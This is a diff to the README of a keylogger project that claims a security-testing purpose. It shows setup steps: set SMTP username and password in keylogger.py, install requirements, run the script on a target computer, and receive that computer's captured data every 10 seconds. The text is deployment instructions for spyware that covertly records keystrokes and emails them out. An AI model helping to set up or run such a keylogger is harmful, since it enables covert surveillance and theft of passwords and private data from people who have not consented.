@@ -17,8 +17,9 @@ Purpose of the project is testing the security of information systems
 
 •**Set your own SMTP USERNAME and SMTP PASSWORD on "keylogger.py".**
 
+•**pip install -r requirements.txt**
 
-•**Run keylogger.py on Target Computer**
+•**python3 keylogger.py**
 
 •**Every 10 seconds,You Get the Data from the Target Computer**
 
